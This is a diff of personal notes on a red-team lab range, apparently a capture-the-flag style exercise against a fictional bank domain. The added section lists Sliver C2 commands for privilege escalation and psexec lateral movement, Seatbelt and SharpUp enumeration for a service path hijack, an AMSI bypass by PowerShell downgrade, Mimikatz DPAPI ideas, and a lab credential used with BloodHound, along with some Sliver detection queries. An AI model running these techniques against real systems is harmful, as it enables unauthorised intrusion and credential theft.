@@ -8,14 +8,15 @@ Goals:
 	- Subbed to 0xTiberious
 	- Joined the Work Harder Group
 - Get as many feasible perspectives and tricks
-- Watch the speedrun 
+- Watch the speed run 
 - Get the badge!
 Learnt:
 - Limitations and pitfall of Wordlist generators 
 - Wordlist generator alternative tools
 - Setup Local Email for Red Reasons
-- AlH4zr3d's Phishing and Spearphishing SE leafy-bug strat 
+- AlH4zr3d's Phishing and Spearphishing SE leafy-bug strategy 
 - `fping` is better than `ping`
+- Sliver is awesome
 
 
 
@@ -372,12 +373,125 @@ Crying out the credential changing, Tiberious struggles till he get `admin : pas
 proxychains4 python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d corp.thereserve.loc -ns 10.200.119.102 -u 'lisa.moore' -p 'Scientist2006'
 ```
 
+[[RTCC-BH-Notes-Corp]]
+
+
 
 
 
 ![](bigbypass.png)
 
-## Full Compromise of CORP Domain
+- Procdump did not work (or more likely my brain), but did not get detected. I decide to go for armory tools to escalate first rather than trying to dump lsass, presume that either previous compromises would have left artefacts and 
+
+[Thanks to Cyber attack & defense](https://www.youtube.com/watch?v=izMMmOaLn9g) , 
+```go
+// Display help
+help <command>
+
+// For multi-client
+multiplayer 
+new-operator
+// Connect with Client
+
+// With Administrative and adble to get SeDebugPrivilege - by default uses spool.svc to getsystem 
+getsystem
+
+// psexec is embedded into sliver good for lateral movement
+psexec --profile BEACON <hostname>
+
+// Beacons
+// Drop down to select with arrow keys
+use 
+// Create an interactive sessions
+interactive
+execute -o <command>
+
+
+session -i $id
+
+// Shell
+// Exit shell, be patient wait 30 seconds
+exit
+```
+
+Sliver beacon detection:
+```powershell 
+# Requires Sysmon2
+# look for default nomanclature, but this is easily customised -save /path/name.exe
+WORD_WORD.exe 
+
+powershell.exe -NoExit -Command[Console]::OutputEncoding=[Text:UTF8Encoding]:UTF8
+# by default uses spool.svc to getsystem 
+spool.svc
+```
+
+`Cyberchef` -> `Regular Expresssion -> Regex: Sliver`  then upload file that you suspect is a Sliver binary. Make sure you set the recipe first or you will crash your browser.
+
+```json
+// Language MUST BE: lucene
+event.code:8 AND winlog.event_data.TargetImage:(*spoolsv*) AND winlog.event_data.TargetUser:(*
+NT* AND *AUTHORITY\\SYSTEM*)
+```
+
+reg query the WDIGEST
+```go
+execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
+```
+
+
+```go
+interactive
+sessions -i <id>
+sharpup audit
+execute -o icacls "c:\Backup Service"
+```
+
+We have full control of the backup service 
+![](backupyourpathboyoswearepathhijackrinoingthewrk1.png)
+
+```go
+execute -o sc query state= all
+// COPY and PASTE stop :set paste in vim sometimes...
+xsel -b > WRK1-sc-qc.output 
+```
+
+![](foundthebackupservice.png)
+
+Sadly I got 193 error meaning that I could perform the path hijack and the serviceName service outputs error 5 meaning I need administrator
+
+```go
+// 
+seatbelt -h 
+seatbelt UAC // need admin
+seatbelt LAPS // LAPS not enabled
+seatbelt Services 
+// And serviceName is admininstrator
+seatbelt Autoruns
+//   HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run :
+//  C:\Windows\system32\SecurityHealthSystray.exe
+seatbelt WindowsVault // 0
+seatbelt WindowsDefender // No exclusions
+seatbelt WindowsAutoLogon // Autologons
+seatbelt ScheduledTasks // None that run outside of System32
+seatbelt powershell // We can downgrade to bypass AMSI
+```
+
+#### Just checking
+![](wrk1system32icacls.png)
+
+#### What we can do
+
+-  We can downgrade to bypass AMSI
+![](wrk1powershelldowngradeasap.png)
+
+#### What we could consider
+
+-  Mimikatz no laps all bypassing WinDefend still required
+	- `seatbelt DpapiMasterKeys` - use `sekurla:dpapi` module
+
+- Python311
+
+ ## Full Compromise of CORP Domain
 ## Full Compromise of Parent Domain
 ## Full Compromise of BANK Domain
 ## Compromise of SWIFT and Payment Transfer
